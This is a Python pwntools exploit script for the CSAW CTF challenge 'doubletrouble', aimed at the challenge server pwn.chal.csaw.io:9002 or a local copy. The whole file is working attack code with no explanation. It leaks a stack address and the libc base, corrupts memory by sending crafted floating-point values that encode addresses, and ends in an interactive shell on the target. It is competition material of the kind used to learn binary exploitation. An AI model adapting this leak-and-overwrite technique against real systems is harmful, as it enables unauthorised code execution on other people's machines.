#!/usr/bin/env python
# encoding: utf-8

__author__  = 'b1gtang'

from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

BINARY = './doubletrouble'
TARGET = ('pwn.chal.csaw.io', 9002)

if args.E: # or args.R:
    LIBC32 = './libc.so.6'
else:
    LIBC32 = '/lib/i386-linux-gnu/libc.so.6'

if args.R:
    r = remote(TARGET[0], TARGET[1], timeout=5)
else:
    r = process(BINARY, env={'LD_PRELOAD':LIBC32})

def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

def pp(x):
    return struct.unpack('d', struct.pack('Q', x))[0]

code = ELF(BINARY)
libc = ELF(LIBC32)

stack = int(r.recvline().strip(), 16)
log.info(hex(stack))
print r.recvuntil('How long:')
r.sendline('64')

for i in xrange(0, 63):
    r.recvuntil('Give me: ')
    if i != 4:
        r.sendline('-1')
    else:
        r.sendline('-11')
r.recvuntil('Give me: ')
r.sendline(str(pp(0x8049506<<32)))#0x8049080

r.recvuntil('Sorted Array:')
r.recvuntil('0:')
x = r.recvline().strip()
libc.address = (u32(struct.pack('d', eval(x))[4:]) + 1 - 0x1b2000) & 0xfffff000
log.info(hex(libc.address))

log.info(str(pp((libc.address+0x3d200)<<32)))
print r.recvuntil('How long:')
r.sendline('64')

for i in xrange(0, 63):
    r.recvuntil('Give me: ')
    if i != 3:
        if args.R:
            r.sendline(str(pp((libc.address+0x3d200)<<32)))
        else:
            r.sendline(str(pp((libc.address+0x3ada0)<<32)))
    else:
        r.sendline('-11')

r.recvuntil('Give me: ')
r.sendline(str(pp(0x804977f<<32)))#0x8049080
r.recvuntil('66:')
r.sendline('aaaa'+p32(0x0804A12d))

r.interactive()

